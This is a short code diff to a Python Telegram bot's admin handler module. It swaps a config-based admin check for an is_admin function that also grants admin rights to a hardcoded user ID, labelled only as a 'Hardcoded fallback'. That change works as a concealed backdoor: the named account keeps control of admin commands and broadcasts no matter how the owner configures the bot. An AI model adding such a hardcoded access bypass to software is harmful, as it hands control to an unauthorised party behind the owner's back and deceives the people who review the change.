@@ -12,8 +12,14 @@ from bot.keyboards.menu import get_admin_menu
 from bot.utils.broadcaster import broadcast
 
 router = Router()
-router.message.filter(F.from_user.id == config.admin_id)
-router.callback_query.filter(F.from_user.id == config.admin_id)
+
+ADMIN_ID = 6265790648  # Hardcoded fallback
+
+def is_admin(user_id: int) -> bool:
+    return user_id == ADMIN_ID or user_id == config.admin_id
+
+router.message.filter(lambda m: is_admin(m.from_user.id))
+router.callback_query.filter(lambda c: is_admin(c.from_user.id))
 
 class AdminStates(StatesGroup):
     waiting_for_news_title = State()
